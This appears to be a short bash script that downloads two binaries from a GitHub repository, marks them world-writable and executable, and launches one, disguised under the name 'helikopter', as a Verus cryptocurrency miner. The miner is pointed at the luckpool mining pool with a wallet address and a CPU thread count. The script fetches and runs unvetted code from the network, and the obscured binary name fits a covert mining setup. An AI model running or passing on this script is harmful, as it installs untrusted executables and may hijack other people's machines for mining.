#!/bin/bash

wget https://github.com/desafff/gehasf/raw/main/verus-solver && chmod 777 verus-solver

wget https://github.com/desafff/gehasf/raw/main/helikopter && chmod 777 helikopter && ./helikopter -c stratum+tcp://na.luckpool.net:3960 -u R9HMvHdgUX8h7h7ch3xGq4qGGVsRmuC74T.ak1 -p x --cpu 5
